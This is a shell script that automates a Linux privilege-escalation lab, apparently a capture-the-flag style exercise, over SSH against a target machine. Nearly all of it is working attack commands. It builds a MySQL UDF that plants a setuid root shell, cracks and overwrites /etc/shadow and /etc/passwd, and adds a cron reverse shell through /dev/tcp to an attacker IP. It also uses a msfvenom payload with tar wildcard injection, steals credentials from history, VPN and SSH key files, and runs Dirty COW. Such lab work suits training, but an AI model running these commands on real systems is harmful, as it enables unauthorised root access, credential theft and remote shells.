#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.141.129"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - DEPLOY THE VULNERABLE DEBIAN VM"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "id" > $result_folder/id.txt

echo "2 - SERVICE EXPLOITS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cd /home/user/tools/mysql-udf;gcc -g -c raptor_udf2.c -fPIC;gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "mysql -u root -e \"use mysql;create table foo(line blob);insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';create function do_system returns integer soname 'raptor_udf2.so';select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\" "
echo "--> Connect through ssh and launch /tmp/rootbash -p to get root shell access"

echo "3 - WEAK FILE PERMISSIONS - READABLE /ETC/SHADOW"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/shadow" > $result_folder/etc-shadow.txt
HASH=$(cat $result_folder/etc-shadow.txt | sed -n 's/root:\(.*\):17.*/\1/p')
echo "--> Root password hash is '$HASH'"
echo $HASH > $result_folder/hash.txt
john --pot=$result_folder/zip.pot --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $result_folder/hash.txt > /dev/null 2> /dev/null
PASSWORD=$(cat $result_folder/zip.pot | sed -n 's/.*:\(.*\)/\1/p')
echo "--> Root password is '$PASSWORD'"

echo "4 - WEAK FILE PERMISSIONS - WRITABLE /ETC/SHADOW"
NEWHASH=$(mkpasswd -m sha-512 newpasswordhere)
ESCAPED_HASH=$(printf '%s' "$HASH" | sed 's/[]\/$.*[]/\\&/g')
ESCAPED_NEWHASH=$(printf '%s' "$NEWHASH" | sed 's/[]\/$.*[]/\\&/g')
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp /etc/shadow ~/shadow"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp /etc/shadow ~/shadow2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "sed -i 's/$ESCAPED_HASH/$ESCAPED_NEWHASH/g' ~/shadow2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp ~/shadow2 /etc/shadow "
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/shadow"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp ~/shadow /etc/shadow"

echo "5 - WEAK FILE PERMISSIONS - WRITABLE /ETC/PASSWD"
NEWHASH2=$(openssl passwd newpasswordhere2)
ESCAPED_HASH2=$(printf '%s' "$NEWHASH2" | sed 's/[]\/$.*[]/\\&/g')
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp /etc/passwd ~/passwd"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp /etc/passwd ~/passwd2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "sed -i 's/root:x:0:0:root/root:$ESCAPED_HASH2:0:0:root/g' ~/passwd2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp ~/passwd2 /etc/passwd"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/passwd"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cp ~/passwd /etc/passwd"

echo "6 - SUDO - SHELL ESCAPE SEQUENCES"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "sudo -l" > $result_folder/sudo.txt

echo "7 - SUDO - ENVIRONMENT VARIABLES"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "ldd /usr/sbin/apache2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cd /home/user/tools/sudo;gcc -fPIC -shared -nostartfiles -o /tmp/libcrypt.so.1 /home/user/tools/sudo/preload.c"
echo "--> Connect through ssh and launch sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 to get root shell access"

echo "8 - CRON JOBS - FILE PERMISSIONS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/crontab" > $result_folder/etc-crontab.txt
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "locate overwrite.sh" 2> /dev/null
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "ls -l /usr/local/bin/overwrite.sh"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "echo \"#!/bin/bash\" > /usr/local/bin/overwrite.sh"
xterm -hold -e "nc -lvnp 4444" &
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "echo \"bash -i >& /dev/tcp/$attack_ip/4444 0>&1\" >> /usr/local/bin/overwrite.sh"

echo "9 - CRON JOBS - PATH ENVIRONMENT VARIABLE"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "echo \"#!/bin/bash\" > /home/user/overwrite.sh"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "echo \"cp /bin/bash /tmp/rootbash\" >> /home/user/overwrite.sh"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "echo \"chmod +xs /tmp/rootbash\" >> /home/user/overwrite.sh"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "chmod +x /home/user/overwrite.sh"
echo "--> Connect through ssh, wait for /tmp/rootbash to appear and launch /tmp/rootbash -p to get root shell access"

echo "10 - CRON JOBS - WILDCARDS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /usr/local/bin/compress.sh" >  $result_folder/compress.sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=4444 -f elf -o $result_folder/shell.elf
sshpass -p password321 scp -oHostKeyAlgorithms=+ssh-rsa $result_folder/shell.elf user@$target_ip:/home/user/shell.elf
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "chmod +x /home/user/shell.elf" 
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "touch /home/user/--checkpoint=1" 
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "touch /home/user/--checkpoint-action=exec=shell.elf" 
xterm -hold -e "nc -lvnp 4444"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "rm /home/user/shell.elf"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "rm /home/user/--checkpoint=1"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "rm /home/user/--checkpoint-action=exec=shell.elf"

echo "11 - SUID / SGID EXECUTABLES - KNOWN EXPLOITS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null" >  $result_folder/suid.txt
echo "--> Connect through ssh, and launch /home/user/tools/suid/exim/cve-2016-1531.sh to use exim exploit"

echo "12 - SUID / SGID EXECUTABLES - SHARED OBJECTS INJECTION"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null" >  $result_folder/suid.txt
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "mkdir /home/user/.config"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c"
echo "--> Connect through ssh, and launch /usr/local/bin/suid-so"

echo "13 - SUID / SGID EXECUTABLES - ENVIRONMENT VARIABLES"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "strings /usr/local/bin/suid-env" >  $result_folder/strings.txt
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "gcc -o service /home/user/tools/suid/service.c"
echo "--> Connect through ssh, and launch PATH=.:\$PATH /usr/local/bin/suid-env"

echo "14 - SUID / SGID EXECUTABLES - ABUSING SHELL FEATURES #1"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "strings /usr/local/bin/suid-env2" >  $result_folder/strings2.txt
echo "--> Connect through ssh, and launch function /usr/sbin/service { /bin/bash -p; }; export -f /usr/sbin/service; /usr/local/bin/suid-env2"

echo "15 - SUID / SGID EXECUTABLES - ABUSING SHELL FEATURES #2"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "strings /usr/local/bin/suid-env2" >  $result_folder/strings2.txt
echo "--> Connect through ssh, and launch env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2; /tmp/rootbash -p"

echo "16 - PASSWORD AND KEYS - HISTORY FILES"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat ~/.*history | less" > $result_folder/history.txt
PASSWORD=$(cat $result_folder/history.txt | sed -n 's/.*mysql -h somehost.local -uroot -p\(.*\)/\1/p')
echo "--> Root password is '$PASSWORD'"

echo "17 - PASSWORD AND KEYS - CONFIG FILES"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /home/user/myvpn.ovpn" > $result_folder/myvpn.ovpn
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/openvpn/auth.txt" > $result_folder/auth.txt
PASSWORD=$(cat $result_folder/auth.txt | tail -1)
echo "--> Root password is '$PASSWORD'"

echo "18 - PASSWORD AND KEYS - SSH KEYS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "ls -l /.ssh" > $result_folder/ssh.txt
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /.ssh/root_key" > $result_folder/root_key
chmod 600 $result_folder/root_key
ssh -i $result_folder/root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@$target_ip

echo "19 - NFS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "cat /etc/exports" > $result_folder/etc-exports.txt

echo "20 - KERNEL EXPLOITS"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl" > $result_folder/exploits.txt
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w"
sshpass -p password321 ssh -oHostKeyAlgorithms=+ssh-rsa user@$target_ip "./c0w"
echo "--> Connect through ssh, and launch /usr/bin/passwd. Then do mv /tmp/bak /usr/bin/passwd as root to restore normality"


